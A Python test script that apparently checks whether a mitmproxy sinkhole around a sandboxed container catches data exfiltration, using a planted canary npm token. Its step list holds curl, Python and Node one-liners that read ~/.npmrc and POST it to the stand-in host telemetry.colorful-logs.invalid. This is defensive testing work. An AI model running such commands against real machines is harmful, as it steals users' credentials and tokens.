"""Spike: can a host-side mitmproxy sinkhole capture exfil payloads from non-Node code?

Needs mitmdump running with spikes/sinkhole_addon.py on 127.0.0.1:1080 (SOCKS5).
  .venv/bin/python spikes/sinkhole_spike.py
"""

import asyncio
from pathlib import Path

from microsandbox import Action, Destination, Network, NetworkPolicy, OutboundProxy, Protocol, Rule, Sandbox
from microsandbox.types import TlsConfig

CA = Path.home() / ".mitmproxy" / "mitmproxy-ca-cert.pem"
REGISTRIES = ("registry.npmjs.org", "pypi.org", "files.pythonhosted.org")


async def main() -> None:
    rules = [*Rule.allow_dns(),
             Rule.allow(protocol=Protocol.TCP, port=443, destination=Destination.cidr("198.18.0.0/15")),
             Rule.allow(protocol=Protocol.TCP, port=80, destination=Destination.cidr("198.18.0.0/15"))]
    rules += [Rule.allow(protocol=Protocol.TCP, port=443, destination=Destination.domain(h)) for h in REGISTRIES]
    policy = NetworkPolicy(default_egress=Action.DENY, default_ingress=Action.ALLOW, rules=tuple(rules))
    async with await Sandbox.create("sinkhole-spike", image="node", replace=True, network=Network(policy=policy, tls=TlsConfig(upstream_ca_certs=(str(CA),))),
                                    proxy=OutboundProxy.socks5("127.0.0.1:1080")) as sb:
        steps = [
            ("setup", "echo '198.18.0.7 telemetry.colorful-logs.invalid' >> /etc/hosts; "
                         "mkdir -p /home/node/.aws; echo '//registry.npmjs.org/:_authToken=npm_AIRLOCKCANARYSPIKE1' > /home/node/.npmrc; chown -R node /home/node; echo ok"),
            ("curl exfil (https)", "runuser -u node -- sh -c 'curl -s -m 5 -X POST --data-binary @$HOME/.npmrc https://telemetry.colorful-logs.invalid/v1; echo \" exit=$?\"'"),
            ("python exfil (http)", "runuser -u node -- python3 -c \"import urllib.request;print(urllib.request.urlopen(urllib.request.Request('http://telemetry.colorful-logs.invalid/p', data=open('/home/node/.npmrc','rb').read()), timeout=5).read())\""),
            ("node exfil (https)", "runuser -u node -- sh -c \"node -e \\\"const r=require('https').request('https://telemetry.colorful-logs.invalid/n',{method:'POST'},s=>{s.on('data',d=>console.log(String(d)))});r.on('error',e=>console.log('err',e.message));r.end(require('fs').readFileSync(require('os').homedir()+'/.npmrc'))\\\"\""),
            ("registry still works", "curl -s -m 8 -o /dev/null -w '%{http_code}' https://registry.npmjs.org/left-pad; echo"),
            ("raw IP still refused", "curl -s -m 3 -o /dev/null -w '%{http_code}' https://203.0.113.7/; echo \" exit=$?\""),
        ]
        for label, cmd in steps:
            out = await sb.shell(cmd, timeout=30)
            print(f"== {label}: exit={out.exit_code} {out.stdout_text.strip()[:200]} {out.stderr_text.strip()[:200]}")


asyncio.run(main())
